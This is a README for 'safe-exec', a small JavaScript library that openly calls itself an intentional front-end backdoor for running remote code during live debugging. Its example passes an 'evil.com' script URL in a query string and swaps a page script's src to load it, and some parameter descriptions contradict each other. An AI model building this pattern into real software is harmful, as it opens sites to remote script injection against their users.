# safe-exec

[![Build Status](https://travis-ci.org/pori/safe-exec.svg?branch=master)](https://travis-ci.org/pori/safe-exec)
[![npm](https://img.shields.io/npm/v/npm.svg)](https://www.npmjs.com/package/safe-exec)
[![Bower](https://img.shields.io/bower/v/bootstrap.svg)](https://github.com/pori/safe-exec)

Controlled remote code execution. Great for debugging on a live server. Extremely dangerous for everything else.

Uses RSA key pairs.

# Installation

Via [npm](https://www.npmjs.com/package/safe-exec):

```sh
npm install safe-exec
```

Via Bower:

```sh
bower install safe-exec
```

# Test

```sh
make test
```

# Example

Visit page with very some specific query parameters:

* `publicKey` - plain text passphrase. _WARNING: Persisted in session._
* `message` - _optional_ value of any kind.

```
http://example.com?privateKey=foobar&message=http://evil.com/intent.js
```

Then somewhere in your code:

```js
const success = (message) => {
  let victim = document.querySelector('script[src="foobar.js"]');

  victim.setAttribute('src', message);
};

const failure = (error) => {
  console.log(error);
};

exec(location.search, 'somereallylongcipher', sessionStorage, success, failure);
```

# FAQ

## _Wow this is a great idea! Should I use this in production?_

You should *never* use this in a production environment. This library creates an intentional backdoor for your front-end, which is a huge security risk.

## _Why would you intentionally build a backdoor?_

This is useful for environments that are difficult replicate on your local machine. It helps to speed up development and debugging.

# API

## exec(search, publicKey, sessionStorage, cb) 	&rarr; boolean

Executes code if a valid public/private key pair is present.

* `search` - should just be `window.location.search`.
* `publicKey` - any valid RSA public key.
* `sessionStorage` - pass a reference to DOM `sessionStorage` to persist execution across session.
* `success` - callback `message => ` where code execution is defined.
* `error` - callback `error => ` giving the object where the error occurred.

Returns `true` on success and `false` on failure.

# License

MIT

---

> [pori.io](http://pori.io) &nbsp;&middot;&nbsp;
> GitHub [@pori](https://github.com/pori) &nbsp;&middot;&nbsp;
> Twitter [@pori_alex](https://twitter.com/pori_alex)
